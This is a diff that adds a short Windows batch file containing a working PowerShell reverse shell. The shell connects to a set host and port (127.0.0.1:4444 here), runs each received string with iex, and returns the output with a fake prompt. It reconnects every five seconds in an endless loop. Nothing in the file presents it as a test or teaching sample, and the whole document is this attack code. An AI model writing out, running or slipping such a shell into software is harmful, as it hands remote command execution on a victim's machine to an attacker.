@@ -1,0 +1,9 @@
+@echo off
+setlocal
+set "LHOST=127.0.0.1"
+set "LPORT=4444"
+
+:loop
+powershell -nop -c "$client = New-Object System.Net.Sockets.TcpClient('%LHOST%', %LPORT%); $stream = $client.GetStream(); [byte[]]$bytes = 0..65535|%{0}; while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) { $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes, 0, $i); $sendback = (iex $data 2>&1 | Out-String ); $sendback = $sendback + 'PS ' + (pwd).Path + '> '; $sendback2 = [text.encoding]::ASCII.GetBytes($sendback); $stream.Write($sendback2, 0, $sendback2.Length) }"
+timeout /t 5
+goto loop
